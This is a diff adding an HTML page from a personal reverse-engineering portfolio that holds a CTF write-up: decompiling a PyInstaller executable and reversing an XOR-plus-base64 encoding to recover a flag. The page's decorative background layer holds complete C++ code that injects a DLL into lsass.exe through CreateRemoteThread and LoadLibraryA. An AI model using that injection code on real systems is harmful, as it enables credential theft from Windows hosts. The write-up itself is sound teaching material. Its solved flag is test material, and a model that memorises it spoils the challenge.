@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Know Meh Better</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Know Meh Better" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Know Meh Better</h1>
+            
+            <p class="post-meta">Published: May 7, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">HQX{2483296533b73b50eb2cde9245401d74}</code></p>
+
+<h2 id="approach-step-by-step">Approach (Step by Step)</h2>
+
+<ol>
+  <li>The challenge provided a Windows executable named <code class="language-plaintext highlighter-rouge">know_meh_better.exe</code> and a text file named <code class="language-plaintext highlighter-rouge">output_bBe4FD65f8.txt</code>.</li>
+  <li>I started by using <code class="language-plaintext highlighter-rouge">pyinstxtractor</code> to decompile the executable, which is a common approach for Python binaries packaged with PyInstaller:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 pyinstxtractor.py know_meh_better.exe
+</code></pre></div>    </div>
+  </li>
+  <li>This successfully extracted the <code class="language-plaintext highlighter-rouge">.pyc</code> files into a directory. The main logic of the challenge was located in <code class="language-plaintext highlighter-rouge">know_meh_better.pyc</code>.</li>
+  <li>I then used <code class="language-plaintext highlighter-rouge">uncompyle6</code> to decompile the <code class="language-plaintext highlighter-rouge">.pyc</code> file back into readable Python source code:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uncompyle6 know_meh_better.pyc <span class="o">&gt;</span> know_meh_better.py
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="analyzing-the-source-code">Analyzing the Source Code</h3>
+
+<ol>
+  <li>The decompiled script revealed a questionnaire-style challenge containing fake trivia questions about the author. A <code class="language-plaintext highlighter-rouge">FLAG</code> variable was present, but it was just a fake flag (<code class="language-plaintext highlighter-rouge">HQX{fake_flag}</code>).</li>
+  <li>
+    <p>However, the script contained <code class="language-plaintext highlighter-rouge">encode_flag</code> and <code class="language-plaintext highlighter-rouge">decode_flag</code> functions, which used an XOR-based encryption routine:</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">slt</span> <span class="o">=</span> <span class="nb">len</span><span class="p">.</span><span class="n">__doc__</span>
+
+<span class="k">def</span> <span class="nf">encode_flag</span><span class="p">(</span><span class="n">flg</span><span class="p">):</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="p">(</span><span class="sh">''</span><span class="p">).</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">flg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">slt</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">slt</span><span class="p">)]))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">flg</span><span class="p">))]).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">encoded</span>
+
+<span class="k">def</span> <span class="nf">decode_flag</span><span class="p">(</span><span class="n">flg</span><span class="p">):</span>
+    <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="n">flg</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">decoded</span> <span class="o">=</span> <span class="p">(</span><span class="sh">''</span><span class="p">).</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">encoded_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">slt</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">slt</span><span class="p">)]))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">encoded_bytes</span><span class="p">))])</span>
+    <span class="k">return</span> <span class="n">decoded</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The script relies on the docstring of the built-in <code class="language-plaintext highlighter-rouge">len</code> function (<code class="language-plaintext highlighter-rouge">len.__doc__</code>) as its XOR key (<code class="language-plaintext highlighter-rouge">slt</code>).</li>
+  <li>Let’s look at <code class="language-plaintext highlighter-rouge">output_bBe4FD65f8.txt</code>:
+    <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0123322c1714694427216d173a393b543f5a210f6e133a0c23276205374a2b4a39283b412c033f543c6a131d2e31115e4625==
+</code></pre></div>    </div>
+    <p>The <code class="language-plaintext highlighter-rouge">output</code> file contained a hex string, but it was oddly appended with <code class="language-plaintext highlighter-rouge">==</code>. Hexadecimal encodings do not use padding characters like base64 does.</p>
+  </li>
+</ol>
+
+<h3 id="decrypting-the-flag">Decrypting the Flag</h3>
+
+<ol>
+  <li>
+    <p>I created a custom Python script to replicate the decryption routine, keeping in mind that the <code class="language-plaintext highlighter-rouge">==</code> might have been unintentionally excluded from the hex conversion but was part of the original encoded string (like a base64 payload).</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">slt</span> <span class="o">=</span> <span class="nb">len</span><span class="p">.</span><span class="n">__doc__</span>
+
+<span class="k">def</span> <span class="nf">decode_flag</span><span class="p">(</span><span class="n">flg</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">flg</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">==</span><span class="sh">'</span><span class="p">):</span>
+        <span class="c1"># Remove the base64 padding to decode the hex part
+</span>        <span class="n">flg</span> <span class="o">=</span> <span class="n">flg</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+       
+    <span class="c1"># Convert the hex string to bytes
+</span>    <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">flg</span><span class="p">)</span>
+       
+    <span class="c1"># XOR each byte with the key (len.__doc__)
+</span>    <span class="n">decoded</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">encoded_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">slt</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">slt</span><span class="p">)]))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">encoded_bytes</span><span class="p">))])</span>
+    <span class="k">return</span> <span class="n">decoded</span>
+
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0123322c1714694427216d173a393b543f5a210f6e133a0c23276205374a2b4a39283b412c033f543c6a131d2e31115e4625==</span><span class="sh">"</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">decode_flag</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Running the script gave the output: <code class="language-plaintext highlighter-rouge">SFFYezI0ODMyOTY1MzNiNzNiNTBlYjJjZGU5MjQ1NDAxZDc0fQ</code>.</li>
+  <li>
+    <p>Appending the missing <code class="language-plaintext highlighter-rouge">==</code> padding and decoding the resulting base64 string (<code class="language-plaintext highlighter-rouge">SFFYezI0ODMyOTY1MzNiNzNiNTBlYjJjZGU5MjQ1NDAxZDc0fQ==</code>) revealed the actual flag!</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"SFFYezI0ODMyOTY1MzNiNzNiNTBlYjJjZGU5MjQ1NDAxZDc0fQ=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div>    </div>
+    <p>Result: <code class="language-plaintext highlighter-rouge">HQX{2483296533b73b50eb2cde9245401d74}</code></p>
+  </li>
+</ol>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
